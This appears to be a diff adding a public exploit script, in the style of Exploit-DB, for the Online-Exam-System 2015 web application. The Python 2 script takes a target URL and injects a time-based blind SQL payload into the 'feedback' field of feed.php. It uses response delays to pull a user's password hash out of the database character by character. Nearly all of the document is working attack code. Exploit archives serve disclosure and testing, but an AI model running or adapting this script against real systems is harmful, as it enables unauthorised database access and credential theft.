@@ -1,0 +1,34 @@
+# Exploit Title: Online-Exam-System 2015 - 'feedback' SQL Injection
+# Date: 2020-06-04
+# Exploit Author: Gus Ralph
+# Vendor Homepage: https://github.com/sunnygkp10/
+# Software Link: https://github.com/sunnygkp10/Online-Exam-System-.git
+# Affected Version: 2015
+# Tested on: Ubuntu
+# CVE : N/A
+
+import requests, string, time
+from sys import stdout
+
+URL = raw_input("Please enter the URL to attack (example http://localhost/Online-Exam-System/)\n")
+
+payload = "feedback' , '2020-06-04', '01:58:10am'),('1337','test','test@test.com','test',(SELECT CASE WHEN (SELECT EXISTS(SELECT password FROM user WHERE password REGEXP BINARY '^"
+payload2 = ".*'))=1 THEN sleep(5) ELSE sleep(0) END),'2020-06-04', '01:58:10am'); -- -"
+so_far = hash = ""
+while True:
+	for i in string.digits + string.ascii_lowercase:
+		so_far = hash + i
+		payload_to_send = payload + str(so_far) + payload2
+		data = {"name":"test","email":"test@test.com","subject":"test","feedback":payload_to_send}
+		start = time.time()
+		r = requests.post(URL + "feed.php", data = data)
+		request_time = time.time() - start
+		if request_time > 5:
+			hash += i
+			stdout.write(i)
+			stdout.flush()
+			break
+	if len(hash) > 31:
+		stdout.write("\n")
+		print "Hash found: " + hash
+		break
